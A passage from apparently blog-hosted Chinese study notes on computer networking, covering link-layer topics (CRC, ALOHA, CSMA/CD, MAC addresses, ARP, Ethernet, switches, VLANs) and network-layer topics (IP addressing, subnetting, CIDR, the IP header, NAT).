1）。除数往往也用多项式表示，所以 CRC 又称多项式编码方法，这个多项式也称为生成多项式 余数的位数一定是比除数位数小一位，即使前面全是 0，也不要省略 帧检验序列 FCS – Frame Check Sequence。这里的冗余码就称为 FCS，由其他的校验方法，也能得到对应的 FCS 并不能做到可靠传输 ，必须加上确认和重传机制（其他层协议负责） 介质访问控制（MAC）\u0026ndash;专用于广播信道 多路访问 广播信道中，往往只有 1 条共享的广播信道 (single shared broadcast channel)，却有两个或多个节点，可能发生同时的数据传输\n这会导致干涉的发生（或“碰撞 collision”）：如果一个 node 同时需要发送两个信号，或者多个 node 需要同时发送多个信号。\n如何使众多用户能够合理而方便地共享通信媒体资源，这在技术上有两种方法：\n静态划分信道：频分复用、时分复用、波分复用和码分复用等，不适合局域网 动态媒体接入控制，又称为多点接入(multiple access)，包括随机接入和受控接入 分布式算法 – 每个节点上分别决定是否应该发送信号 “how nodes share channel”“何时可以发送信号” 注意，所有的协议通信用到的也是该广播信道自身！即，没有额外的信道用于协调这些节点。 共有三种信道复用的协议：\n信道划分 （channel partitioning） 将信道分为小块（例如分成 time slots、根据频率划分、采用不同的编码调制信号等） 每一小块被一个节点独享 TDMA TDMA：time division multiple access 时分复用\n节点分轮（in “rounds”）使用信道：每个节点在每一轮都会获得定长的 slot（通常 slot 的长度等于传输 packet 的时间）分配但未用的 slot 则保持闲置\n例：6 个节点，节点 1、3、4 发送数据，而节点 2、5、6 不发送数据 FDMA FDMA：frequency division multiple access 频分复用\n信道的频谱划分为不同的频段,每个节点分配使用固定的频段发送数据,对于不发送数据的节点，对应的频段即为闲置状态\nCDMA CDMA：code division multiple access 码分复用\n将需要发送的信号通过不同的编码进行调制，然后复用广播信道\n随机接入 （random access） 不划分信道，允许碰撞：\n如果恰巧有两个或更多的用户在同一时刻发送信息，那么在共享媒体上就要产生碰撞,使得这些用户的发送都失败 问题在于：\n尝试从“碰撞”中“恢复” 如何避免碰撞发生和碰撞发生怎么办 ALOHA 协议——最早的随机访问方法 纯 ALOHA 只要有站点需要发送帧，它就发送帧\n纯 ALOHA 依赖于接收方的确认，如果接收方确实收到了帧，它就会向发送方发送确认，只有当发送方收到该确认通知后，发送方才判定该帧成功发送，否则就要重发\n但是，如果多个同时发送失败的站点同时重发，那么还是很可能发送失败。所以，为了避免再一次堵车，纯 ALOHA 指定站点重发之前随机等待一段时间（补偿时间 $T_{B}$ ），相当于错峰开车\n同时，如果站点多次失败，站点就暂时躺平不发送了，等到以后再发送该帧，相当于摆烂\n我们程脆弱时间为可能碰撞的时间长度，则纯 ALOHA 虽弱时间为 2T\nslotted ALOHA 时间轴划分为等长的时隙（slots），通常是传输一帧的时间，而且节点均只在时隙开始的时候传输 节点的行为是同步的 如果超过两个节点在一个时隙同时传输，则所有节点能侦测到碰撞 所以时隙 ALOHA 是对纯 Aloha 的一种改进，其基本思想是把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送，这样就只有完全碰撞没有部分碰撞，脆弱时间从 2T 减少到 T\n步骤：\n当节点进入阅读器的识别范围后，节点自身携带的随机数发生器产生一随机数，节点按此随机数选择时隙，若查询时的时隙数与节点选择的时隙相匹配时节点即响应，并立即发送自身的数据信息 若时隙内有碰撞时，阅读器将终止节点继续发送信息并令节点等待下一次查询，该节点在以后的每一个时隙均以概率 𝑝 进行重传，直至传输成功 （C-collide,E-empty,S-success）\n优点：\n每个时隙中，都有一个节点可以一直以全速进行传输。 高度分布式算法：只需把所有节点的时隙进行同步即可，其余全部是通过节点自行探测解决（不像纯 ALOHA 要收到一个确认，然后进行决策） 算法十分简单 缺点：\n碰撞浪费了很多时隙，也会有很多时隙是闲置的 需要一个时隙去侦测碰撞的发生。但事实上节点可能只需要更少的时间就可以侦测碰撞 需要时钟同步（不然时隙的划分就没有用了） 效率不高\r载波侦听多点接入/碰撞检测（CSMA/CD） 基本策略 CSMA/CD 仅用于有线网络，不用于无线网络；无线网络使用 CSMA/CA\n发送数据前先监听广播信道，如果信道空闲，则发送整个帧；如果信道正忙，则延迟发送\n“碰撞检测”就是计算机边发送数据边检测信道上的信号电压大小，就是这个 CSMA 的侦听方式（节点同时在总线上发送数据时，总线上的信号电压摆动值将会增大（互相叠加））\n然后我们可以设置一个门限值，当电压超过门限值的时候，我们就判断它发生了碰撞\n因为有线网络中信号相对于噪声更明显，所以这种侦听方式比较有效；但在无线网络中太多噪声了，这种方式就不管用了\n一旦发现总线上出现了碰撞，总线上传输的信号就产生了严重的失真，无法从中恢复出有用的信息，就要立即停止发送，然后等待一段随机时间后再次发送。\n碰撞检测 最先发送数据帧的站，在发送数据帧后至多经过时间 2𝜏（两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。 以太网的 端到端往返时延 2𝜏 称为争用期(contention period) ，又称为碰撞窗口(collision window)。 只有经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 由上图易知：一个站不可能同时进行发送和接收（但必须边发送边监听信道），当 B 已经收到 A 发送的数据，就准备一直接收，也就是说，只有在争用期内，B 没有发送数据，B 才能顺利开始接收，A 才算通过了考验\n重传机制 截断二进制指数退避(truncated binary exponential backoff)：\n让发生碰撞的站在停止发送数据后，等待信道变为空闲后推迟（这叫做退避）一个随机的时间\n$k = Min[重传次数, 10]$ $[0,1,…, 2^{k −1}]$中随机取一个数乘以争用期$τ$就是需要等待的时间\n当重传达 16 次仍不能成功时，则丢弃该帧，并向高层报告。\n使用上述退避算法可使重传需要推迟的平均时间随重传次数而增大（这也称为动态退避），因而减小发生碰撞的概率，有利于整个系统的稳定\n脆弱时间 优缺点 优点：\n简单 便宜 完全去中心化 缺点：\n使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。 每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性（争用期） 受控接入（taking turns） 用户不能随机地发送信息而必须服从一定的控制 节点轮流发送信息 典型代表有：\n分散控制的令牌环局域网 集中控制的多点线路探询(polling)，或称为轮询 Taking turns 轮流接入 让受控的节点轮流发送就不会碰撞了\n轮询 polling 主节点管理次节点，决定他们什么时候轮流发送数据（主节点需要具备一定智能，而次节点不需要），这种方法称为轮询\n存在轮询的开销、延迟、单点故障（即 master 节点）的问题\n令牌传递 token passing 受控的令牌从一个节点依次序传递到下一个节点，有令牌的节点即可发送帧（击鼓传花，传到花的就唱歌）\n节点之间不必物理地连成环，只要逻辑上每个节点都有前驱和后继即可\n存在传递令牌的开销、延迟，单点故障（令牌本身）的问题\n链路层寻址 链路层地址：又称为链路地址、物理层地址、MAC 地址\nMAC 地址用于将一个帧传输到另一个接口 used ‘locally” to get frame from one interface to another physically-connected interface (same network, in IP-addressing sense)\n48 位的 MAC 地址 EUI-48 IEEE 的注册管理机构 RA 负责向厂家分配地址字段 6 个字节中的前三个字节 (即高位 24 位)，称为组织唯一标识符。 地址字段 6 个字节中的后三个字节 (即低位 24 位) 由厂家自行指派，称为扩展唯一标识符，必须保证生产出的适配器没有重复地址。 因此就保证了全世界每个适配器、每个接口/端口，有唯一的 MAC 地址（$2^{24}$个不同的地址），用这种方式得到的 48 位地址称为 EUI-48，这里 EUI 表示扩展的唯一标识符(Extended Unique Identifier)\n同时，MAC 地址不是等级化的（与上级其他设备无关），保证了可移植性（可以把网卡从这个局域网移动到另一个局域网使用）\nMAC 地址有什么用 适配器从网络上每收到一个 MAC 帧就首先用硬件检查 MAC 帧中的 MAC 地址\n如果是发往本站的帧则收下，然后再进行其他的处理。 否则就将此帧丢弃，不再进行其他的处理。 这里“发往本站的帧”包括：\n单播(unicast)帧（一对一）：即收到的帧的 MAC 地址与本站的硬件地址相同。 广播(broadcast)帧（一对全体）：即发送给本局域网上所有站点的帧（全 1 地址）。 多播(multicast)帧（一对多）：即发送给本局域网上一部分站点的帧。 混杂方式(promiscuous mode) 嗅探器(Sniffer)就使用了设置为混杂方式的网络适配器\n适配器只要“听到”有帧在以太网上传输就都悄悄地接收下来，而不管这些帧是发往哪个站（抓包）\nARP 协议 – Address Resolution Protocol MAC 帧的格式 类型意为收到该帧之后，应传送给网络层的何种协议（大部分为 IP 协议）\nARP 表-转 IP 为 MAC 在实际工作时，不可能总是和与我们实际相邻的物理设备通信，我们往往会和离我们很远的主机通信，这样我们无法知道那个主机接口的 MAC 地址。这时候我们需要利用网络层的 IP 地址转为 MAC 地址 IP 地址是在全球范围内标识一台主机的地址\n局域网中的每个节点（主机、路由器等）都有一张 ARP 表，存储了局域网中某些节点的 IP 地址/MAC 地址的映射关系（\u0026lt;IP address; MAC address; TTL（多久删除）\u0026gt;）\n只有找到接口的 MAC 地址，我们才能在物理相邻的网络中与其通信\n在局域网中学习 ARP 表 由此可见，ARP 协议是“即插即用”的：节点创建自己的 ARP 表格，并不需要网络管理员的人工干涉\n不在局域网中学习 ARP 表 过程基本相同，但需要分开先从边缘路由器跳转，获得各自的 MAC 地址\n-\u0026gt; 具体过程，需要先学习 IP 协议，此处不展开\n局域网\u0026ndash;典型广播信道 因为局域网中的以太网过于优秀而被广泛使用，现在以太网几乎成为了局域网的同义词\n局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限，每一台主机都是物理相邻的\n以太网 以太网，是现在的事实上的主流有线局域网技术\n单一芯片，可以实现多种带宽（自适应带宽） 第一个广泛采用的局域网技术 简单、便宜、速度快 以太网的物理拓扑（physical topology） 总线拓扑（直至 90 年代中期） 所有节点处于同一碰撞域（可能互相发生碰撞） 星形拓扑（现今） 采用交换机（switch） 每个“辐条”运行各自的以太网协议，各自组成碰撞域 星形环状拓扑结构有一个集线器充当连接线，站点通过两条电线连接集线器，这种结构即使一条链路失效了其他节点也能正常运行，因此不宜故障\n星形拓扑也可用于受控接入\n以太网的帧的结构 preamble 前同步码是不算以太网的帧的首部的，以太网的帧首部包括源地址、目的地址、类型，尾部为冗余码\n同见MAC 帧的结构\n一个以太网帧的长度一定要大于争用期，因传统规定，至少要大于 64 字节\n当数据字段的长度小于 46 字节时，应在数据字段的后面加入整数字节的填充字段，以保证以太网的 MAC 帧长不小于 64 字节。 传统的$10M/s$以太网，争用期为$51.2μs$，最短帧长为 64bit；而对于$100M/s$的以太网（快速以太网），争用期为$5.12μs$，最短帧长仍为 64bit。争用期变化而最短帧长不变\n无效的帧 帧长度不是整数字节 CRC 校验失败 数据字段的长度不在 46~1500 字节之间（MAC 帧长度不在 64~1518 字节之间） 对于检查出的无效 MAC 帧就简单地丢弃，以太网不负责重传丢弃的帧\n以太网的特征（链路层的特征） 无连接：发送的 NIC 和接收的 NIC 并不需要用握手来建立连接 不可靠：接受方不需要发送确认 如果发错了就要靠上层协议修补；上层如果不管下层也不管，没发到就没发到 以太网的信道利用率 在争用期内，各站点发送的帧可能碰撞，那它们碰撞之前花的时间就白费了，这样信道占用率就达不到 100%\n一个站在发送帧时出现了碰撞。经过一个争用期 2t 后（t 是以太网单程端到端传播时延），可能又出现了碰撞。这样经过若干个争用期后，一个站发送成功了。假定发送帧需要的时间是 $T_{0}$，总占用信道时间为$T_{0}+τ$ （最后一个比特发出去后还要在信道上跑$τ$的时间）\n因此，要提高以太网的信道利用率，就必须减小$τ$与$T_{0}$之比 ，我们可以将 这个比定义为 $a = \\frac{τ}{T_{0}}$ ，这样就可以知道，a 越小越好\n为了使得 a 更小，$τ$应尽可能小，而$T_{0}$应该大一点，这就是说，当数据率一定时，以太网的连线的长度受到限制，同时以太网的帧长不能太短\n假设碰撞不会发生，那么信道利用率的极限就应该是$S_{max}=\\frac{T_{0}}{T_{0}+τ}=\\frac{1}{1+a}$，因此 a 应远小于 1\n交换机 同见导论中的《交换机是什么》\n最初人们使用的是网桥(bridge)，后来用交换机(switch)取代了网桥\n为了在链路层扩展以太网，把不同网络连接在一起，我们就需要一个【链路层的专有设备】——交换机，通常也称为“第二层交换机”（L2 switch） 有一种非主流的结构，在第三层也有交换机\n作用：\n存储并转发以太网帧 检查收到的帧的 MAC 地址，选择性地转发该帧到一个或多个链路（寻址） 特点：\n交换机是透明的：主机并不知道交换机的存在 即插即用、自学习：交换机不需要手动配置，它自动学习网络拓扑 接口多：每个接口都直接与一个单台主机或另一个交换机相连，并且一般都工作在全双工方式。 并行性：能同时连通多对接口，使多对主机能同时通信。 能缓存帧 交换机使用了专用的交换结构芯片，用硬件转发，其转发速率非常高。 便宜好用：交换机的性能远远超过普通的集线器，而且价格并不贵。 交换机学习交换表/转发表 交换机通过自动学习知道通过哪个接口能够访问对应主机\n当交换机收到一个帧的时候，就记录源地址，然后根据目的地 MAC 地址，从交换表里面寻找对应条目\n如果找到了，就直接发送（若源地址==目的地址，直接丢弃该帧） 如果没找到，就同时向剩下的几个接口同时发送帧（泛洪 flooding） 在交换机最初发明的时候，这个表是静态的，需要手动添加，虽然简单但是麻烦，而且表会变得很臃肿\n因此，只有当几台主机开始发送数据的时候，交换机才需要开始学习（没用的东西学来干嘛）\n交换机自学习产生的问题 但有时为了增加网络的可靠性，在使用以太网交换机组网时，往往会增加一些冗余的链路。在这种情况下，自学习的过程就可能导致以太网帧在网络的某个环路中无限制地兜圈子\n如图，四个交换机的接口在自娱自乐\n解决方法：\nIEEE 的 802.1D 标准制定了一个生成树协议 STP\n要点是不改变网络的实际拓扑，但在逻辑上则切断某些链路，使得从一台主机到所有其他主机的路径是无环路的树状结构\n简而言之，避免环路的出现\n虚拟局域网 VLAN 情景一：CS 系的学生到 EE 系后还想使用 CS 系的局域网，但是这样就要经过中间整个局域网，效率又低，又不安全 情景二：如果公司中工程部门的两个工程师临时调去别的部门，然后又调回来，那就要在物理上重新布线两次\n官方定义：虚拟局域网 VLAN 是由一些局域网网段构成的与物理位置无关的逻辑组，而这些网段具有某些共同的需求。每一个 VLAN 的帧都有一个明确的标识符，指明发送这个帧的计算机是属于哪一个 VLAN。\n因此-\u0026gt;虚拟局域网其实只是局域网给用户提供的一种服务，而并不是一种新型局域网。\n如图，虚拟局域网内各主机是逻辑上的同组，而不是物理上的同组\n比如 B3 向 B1 发送信息， 以太网交换机不向虚拟局域网以外的计算机传送 B1 的广播信息，这样消息就不会发给其他的主机（交换机可能泛洪），这样子流量也节省了，也更安全了（防止混杂模式）\nVLAN 限制了接收广播信息的工作站数，使得网络不会因传播过多的广播信息 (即 “广播风暴” ) 而引起性能恶化\n虚拟局域网的优点 改善了性能 简化了管理 降低了成本 改善了安全性 虚拟局域网的实现方法 基于交换机端口 靠交换机的端口区分不同组的人，但这样就不能换端口，人员就不能移动\n属于在第一层划分虚拟局域网的方法\n基于 MAC 地址 根据MAC 地址划分组，但这样就需要手动维护一个表，比较麻烦。如果用户的 MAC 地址改变了，则需要管理员重新配置 VLAN。\n属于在第二层划分虚拟局域网的方法\n基于协议类型 根据以太网帧的第三个字段“类型”字段确定该类型的协议属于哪一个虚拟局域网\n属于在第二层划分虚拟局域网的方法\n基于 IP 子网地址 根据以太网帧的第三个字段“类型”字段和 IP 分组首部中的源 IP 地址字段确定该 IP 分组属于哪一个虚拟局域网\n属于在第三层划分虚拟局域网的方法\n基于高层应用和服务 根据高层应用或服务、或者它们的组合划分虚拟局域网，灵活但复杂\nVLAN 的帧的格式 虚拟局域网协议允许在以太网的帧格式中插入一个 4 字节的标识符，称为VLAN 标记 (tag)，用来指明该帧属于哪一个虚拟局域网\n相当于给物品打个标签\n插入 VLAN 标记得出的帧称为802.1Q 帧或带标记的以太网帧\n","date":"2022年11月16日","permalink":"https://peterliuzhi.top/principle/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%93%BE%E8%B7%AF%E5%B1%82/","section":"principle","summary":"To follow, without halt, one aim: There is the secret of success. — Anna Pavlova 计算机网络中的任何设备都需要实现链路层 链路层 两类信道 两个子层 基本概念 数据链路控制（DLC） 流量控制和差错控制 三个基本问题","tags":["计算机网络","链路层"],"title":"链路层"},{"categories":["principle","计算机网络"],"contents":" It isn\u0026rsquo;t where you come from, it\u0026rsquo;s where you\u0026rsquo;re going that counts. — Ella Fitzgerald\n链路层干的事情是局部的，网络层干的事情是全局的\n网络层 概述 网络层提供的服务 路由和转发 网络层提供的两种分组交换的方法 数据报方法：无连接服务（现在使用的） 虚电路方法：面向连接服务 两种方法相比较 路由器架构 总体架构 输入 交换 输出 调度策略 基于优先级 IP 协议 (网际协议) IP 地址 IP地址和MAC地址 为什么不直接用硬件地址进行通信？ 编址方法 分类 IP 地址 点分十进制记法 常见的三类 IP 地址（A、B、C） 分类IP地址的特点 分类IP的缺点 划分子网 划分子网的优缺点 子网掩码——找出IP地址中的子网号 固定长度子网和变长子网 超网（无分类编址）CIDR – Classless Inter-Domain Routing CIDR地址块 路由聚合 (route aggregation)/构成超网 (supernetting) CIDR的简写 CIDR的特点 地址聚合 IP数据报 首部 可变部分 NAT-Network Address Translation 网络地址转换 本地地址和全球地址 专用于本地地址的地址块 NAT转换的具体内容 纯NAT的计算方法 纯NAT的局限 NAPT的计算方法 NAPT的缺点 IPv6 IPv6的特点 IPv6的首部 IPv6的地址 冒号十六进制记法 简写 特殊记法 分类 向IPv6过渡 双协议栈 隧道技术 路由协议/算法 理想的路由算法 分层次的路由选择协议 使用原因 两类路由选择协议 【内部网关协议】路由信息协议 RIP协议 RIP的特点 路由表的建立 RIP2协议报文格式 RIP协议的优缺点 【内部网关协议】开放最短路径优先 OSPF (Open Shortest Path First)协议 三个要点 链路状态数据库 (link-state database) OSPF的区域 OSPF的特点 OSPF分组格式 指定的路由器 与RIP的对比 【外部网关协议】BGP协议 BGP发言人 BGP交换路由信息 BGP发言人交换路径向量 BGP协议的特点 BGP协议的四种报文 BGP协议报文格式 两类基本路由算法 网络的图的抽象 链路成本 路由算法的分类 链路状态算法 距离向量算法 概述 网络层从发送端到接收端传输数据段（segment）\n发送端 接收端 将传输层给的数据段包装成数据报 解包数据包给传输层 每个端、主机、路由都要部署网络层，但是不是所有的网络设备都需要部署网络层（如交换机不需要）\n路由检查 IP 地址，并选择路径分组转发\n网络层提供的服务 分组：把数据分组打包并在终点解包 路由：数据要经过路由的中转才能到达目的地 一个物理网络是网络和连接它们的路由的总和 转发：分组到达路由器的一个端口时，路由器所采取的行为。路由器的决策依据转发表（路由表） 路由和转发 数据平面 控制平面 本地、基于单个路由器的行为 Network-wide 的行为 主要行为：转发 主要行为：路由 网络层提供的两种分组交换的方法 数据报方法：无连接服务（现在使用的） 网络层只负责将数据报从源端发送到目的端，向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务，不保证质量，智能的事情摆在主机上做。\n使用无连接服务时，每一个正在传送的分组都是一个独立的实体，同属于一个报文的诸分组无联系，每一个分组的路由都基于它的头部信息（源地址和目的地址）\n优点：\n网络的造价大大降低 运行方式灵活 能够适应多种应用 （便宜灵活用途广）\n虚电路方法：面向连接服务 借鉴于电信网的成功经验，让网络负责可靠交付，通信之前先建立虚电路 (Virtual Circuit)，以保证双方通信所需的一切网络资源\n虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 请注意，电路交换的电话通信是先建立了一条真正的连接 每个分组都基于分组的标签（虚电路标识符）被转发（这让源地址和目的地址好像变得无用）\n两种方法相比较 路由器架构 网络层使用的路由器称为网关\n总体架构 输入 若交换结构转发分组的速度比所有输入端口分组到达的速度和要慢，则会在输入端口的缓存中发生排队 若缓存溢出，则会产生排队延时或分组丢失 HOL 阻塞（Head-of-the-line）：排在队列前面的数据报可能会阻碍队列中其他的数据报的转发 交换 负责将分组从输入端口的缓存发送到合适的输出端口缓存\n交换速率：从所有输入端口到所有输出端口转发分组的速率\n纵横式交换机：每一个交叉点都使用微交换机\n榕树交换机：多级交换机，每一级都有一个微开关\n输出 产生的问题：\n若发出分组的速度比交换结构的速度慢，则分组会在输出端口的缓存中排队。 若缓存大小不足，则分组可能因为发生拥塞而丢失 需要使用调度算法来选择传输哪些排队的分组\n调度策略 基于优先级 高优先级的排队分组最先发送\n分类的标准可能是特殊标记、或其他首部信息。例如 IP 源地址、IP 目的地址、端口号等\n其他还有轮询调度策略等\nIP 协议 (网际协议) 与 IP 协议配套使用的还有三个协议：\n地址解析协议 ARP (Address Resolution Protocol) 网际控制报文协议 ICMP (Internet Control Message Protocol) 网际组管理协议 IGMP (Internet Group Management Protocol) 利用 IP 协议就可以使这些性能各异的网络在网络层上看起来好像是一个统一的网络。这种使用 IP 协议的虚拟互连网络可简称为 IP 网（IP 网是虚拟的，但平常不必每次都强调“虚拟”二字）。\nIP 地址 IP 地址就是给每个连接在互联网上的主机（或路由器）分配一个在全世界范围是唯一的 32 位的标识符（一般用形如 X.X.X.X 的方式表示，每个 X 对应 8 位的二进制数）\nIP地址和MAC地址 硬件地址（或物理地址）是数据链路层和物理层使用的地址。 IP 地址是网络层和以上各层使用的地址，是一种逻辑地址（称 IP 地址是逻辑地址是因为 IP 地址是用软件实现的）。 IP 层抽象的互联网却屏蔽了下层这些很复杂的细节。只要我们在网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机和主机或路由器之间的通信\n在链路层是看不到IP地址的，只能看到帧，然后把取出来的IP数据报抛给网络层去分析，让网络层不必关心链路上传播的细节。\n为什么不直接用硬件地址进行通信？ （过去）难以统一标准：全世界存在着各式各样的网络，它们使用不同的硬件地址 方便快捷：连接到互联网的主机只需各自拥有一个唯一的 IP 地址，它们之间的通信就像连接在同一个网络上那样简单方便 编址方法 分类的 IP 地址 -\u0026gt; 子网的划分（subnetting）-\u0026gt; 构成超网（CIDR）（现在使用）\n分类 IP 地址 IP 地址划分为若干个固定类，每一类地址都由两个固定长度的字段组成：\n网络号 net-id：它标志主机（或路由器）所连接到的网络 主机号 host-id：它标志该主机（或路由器） 网络号在整个互联网内是唯一的，主机号在当前网络下又是唯一的，因此 IP 地址就唯一了\n由于近年来已经广泛使用无分类 IP 地址进行路由选择，A 类、B 类和 C 类地址的区分已成为历史\n点分十进制记法 IP 地址有 32 位，我们把每八位分为一个组，每一个组转化为十进制数，每个数之间用点号隔开，就成了 IP 地址\n常见的三类 IP 地址（A、B、C） A的第一位已经固定为0，B的一二位为10，C的前三位为110\n由上图可知，当IP地址的第一位在1 ~ 126之间为A类地址，128 ~ 191之间为B类，192 ~ 223为C类地址\n其中127开头的为特殊地址\n还有一些特殊的IP地址：\n分类IP地址的特点 IP 地址是一种分等级的地址结构 IP 地址管理机构在分配 IP 地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配（分封制）——方便管理 路由器仅根据目的主机所连接的网络号来转发分组 ——减少占用空间 实际上 IP 地址是标志一个主机（或路由器）和一条链路的接口 当一个主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号 net-id 必须是不同的。这种主机称为多归属主机 (multihomed host)。 由于一个路由器至少应当连接到两个网络（这样它才能将 IP 数据报从一个网络转发到另一个网络），因此一个路由器至少应当有两个不同的 IP 地址 用转发器或网桥连接起来的若干个局域网仍为一个网络，因此这些局域网都具有同样的网络号 net-id 所有分配到网络号 net-id 的网络，无论是范围很小的局域网，还是可能覆盖很大地理范围的广域网，都是平等的 分类IP的缺点 IP 地址空间的利用率有时很低（粒度太粗） 给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变差 两级的 IP 地址不够灵活 划分子网 将原本的两级IP地址的分级制度扩展为三级的IP地址\n原本：网络号+主机号 -\u0026gt; 划分子网：网络号+子网号+主机号\n基本思路：\n划分私有化：划分子网纯属一个单位内部的事情。单位对外仍然表现为没有划分子网的网络。 原本位数不变：从主机号借用若干个位作为子网号 subnet-id，而主机号 host-id 也就相应减少了若干个位 发送方法不变：凡是从其他网络发送给本单位某个主机的 IP 数据报，仍然是根据 IP 数据报的目的网络号 net-id，先找到连接在本单位网络上的路由器。然后此路由器在收到 IP 数据报后，再按目的网络号 net-id 和子网号 subnet-id 找到目的子网。最后就将 IP 数据报直接交付目的主机。 虽然根据已成为互联网标准协议的 RFC 950 文档，子网号不能为全 1 或全 0，但随着无分类域间路由选择 CIDR 的广泛使用，现在全 1 和全 0 的子网号也可以使用了，但一定要谨慎使用，确认你的路由器所用的路由选择软件是否支持全 0 或全 1 的子网号这种较新的用法\n划分子网的优缺点 优点：\n减少了 IP 地址的浪费 使网络的组织更加灵活 更便于维护和管理 缺点： 减少了能够连接在网络上的主机总数\n子网掩码——找出IP地址中的子网号 单单凭借IP地址是无法判断该地址是否进行了子网划分的，因此需要一个掩码（mask）来把无用的信息“档掉”，留下有用的子网号\n把IP地址与掩码进行逐位的与运算，就可以把主机号屏蔽，留下网络号+子网号\nA、B、C类IP地址的默认子网掩码：\n因此，各地方就可以使用不同的子网掩码，从而将子网号从主机号中区分出来\n因此，对于路由器：\n和相邻路由器交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉相邻路由器 路由表中的每一个项目，除了要给出目的网络地址外，还必须同时给出该网络的子网掩码 若一个路由器连接在两个子网上，就拥有两个网络地址和两个子网掩码 固定长度子网和变长子网 有固定长度子网和变长子网两种子网划分方法。\n在采用固定长度子网时，所划分的所有子网的子网掩码都是相同的\n超网（无分类编址）CIDR – Classless Inter-Domain Routing B 类地址在 1992 年已分配了近一半，眼看就要在 1994 年 3 月全部分配完毕！ 互联网主干网上的路由表中的项目数急剧增长（从几千个增长到几万个）。 整个 IPv4 的地址空间最终将全部耗尽 产生的主要原因就是IP不够了\nCIDR消除了A/B/C类的划分，因此可以更加有效地分配IPv4的地址空间：\n网络号和子网号 -\u0026gt; 各种长度的“网络前缀”(network-prefix) 三级地址 -\u0026gt; 两级地址 CIDR 使用 “斜线记法”(slash notation)，又称为 CIDR 记法：\n在 IP 地址面加上一个斜线“/”，然后写上网络前缀所占的位数 -\u0026gt; 代替了子网掩码的作用\n/20的意思是前面有20个1的掩码，因此虽然CIDR不使用子网掩码了，但仍然使用掩码这一概念\n例如： 220.78.168.0/24\nCIDR地址块 CIDR 把网络前缀都相同的连续的 IP 地址组成“CIDR 地址块”\n如，128.14.32.0/20 表示的地址块共有 $2^{12}$ 个地址，简称为“/20 地址块”，最小地址：128.14.32.0，最大地址：128.14.47.255\nps.全 0 和全 1 的主机号地址一般不使用\n路由聚合 (route aggregation)/构成超网 (supernetting) 一个 CIDR 地址块可以表示很多地址，这种地址的聚合常称为路由聚合\n由于相同的IP地址由于网络前缀的不同可以表达不同的意思，而网络前缀的位数又极为自由，所以极大地扩展了IP地址的数量\n优点：\n因为网络前缀的位数是随意定的，所以路由表中的一个项目可以表示很多个（例如上千个）原来传统分类地址的路由 有利于减少路由器之间的路由选择信息的交换，从而提高了整个互联网的性能 CIDR的简写 10.0.0.0/10 可简写为 10/10，也就是把点分十进制中低位连续的 0 省略 网络前缀的后面加一个星号 * 的表示方法，如 00001010 00*，在星号 * 之前是网络前缀，而星号 * 表示 IP 地址中的主机号，可以是任意值 CIDR的特点 前缀长度不超过 23 位的 CIDR 地址块都包含了多个 C 类地址，这些 C 类地址合起来就构成了超网。 CIDR 地址块中的地址数一定是 2 的整数次幂。 网络前缀越短，其地址块所包含的地址数就越多。而在三级结构的IP地址中，划分子网是使网络前缀变长。 地址聚合 这样子路由器就只需要记住206.0.68.0/22就🆗了，剩下大学各个系的IP地址怎么样由大学自己确定，这样路由器的负担就减少了。\n这里其实是用了一种非常优雅的方式表达划分子网的概念\nIP数据报 首部 （每一行是4字节，固定部分一共五行，一共20字节）\n版本号：ipv4、ipv6等版本号 首部长度：最短为0101，单位为四个字节。也就是说首部的长度最低为5*4个字节；这同时也说明了首部的长度最低为1111也就是15*4个字节 区分服务：用于区分向不同数据报提供的服务，一般来说没有用 总长度：一共16位，总长度=首部+数据，单位为字节。所以总长度最大可以到$2^{16} – 1 = 65535$ 字节。但这只是理论长度，由于以太网链路层帧长度的限制，IP数据报的总长度不得超过最大传送单元MTU也就是1500个字节 标识 identification：占16位，IP软件一直在记录产生了多少个IP数据报。当IP数据报因为过长而不得不拆分时，软件就将计数赋予这个数据报的所有分组的标识位 标志/旗标 flag：一共三位，但目前只有两位有意义 最低位为MF MF=1-\u0026gt;后面还有分片 MF=0-\u0026gt;这是最后一个分片 中间位为DF DF=1-\u0026gt;不能分片 DF=0-\u0026gt;允许分片 片偏移：占13位，表示改分片在原本的数据报中的偏移量，也就是其相对位置。单位为8个字节，也就是说每一个分片长度必然为8个字节的整数倍 分片主要是为了满足链路层的限制 但是分片造成数据量和任务量的增加 生存空间 TTL：一共八位 一开始表示数据报在网络中的寿命，当数据报经过一个路由器，就减去在这个路由器消耗的时间（如果时间小于1s就当作1s），防止无效的数据报在网络中兜圈子 后来技术进步，数据报在路由器花费的时间往往远小于1s，TTL意义变为跳数限制的意思，每经过一个路由器就减1 协议：8位，表示网络层应该上交给什么协议 首部检验和：16位，只检验数据报的首部，但不包括数据部分，以节省时间 不采用CRC，采用另一种简单计算方法： 发送方： 把首部分成很多个16位的序列 把检验和的那16位置零 把所有序列按反码相加，结果写入检验和字段 再对结果取反 接收方： 把首部分成很多个16位的序列 把所有序列按反码相加 如果首部无误，则结果必为0 源地址：32位 目的地址：32位 可变部分 IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施\n增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的，增加了每一个路由器处理数据报的开销\n因此，可变部分很少被使用，IPv6甚至直接将数据报设为固定长的\nNAT-Network Address Translation 网络地址转换 使用NAT的原因：\nIP地址紧缺 减少路由表的条目数，减轻路由器的负担 透明性： 更改IP不需要广而告之 可以更改ISP而不需要更改本地设备的IP地址 安全性：本地设备不能直接被外界访问 本地地址和全球地址 本地地址：仅在机构内部使用的 IP 地址，可以由本机构自行分配 全球地址：全球唯一的 IP 地址，必须向互联网的管理机构申请 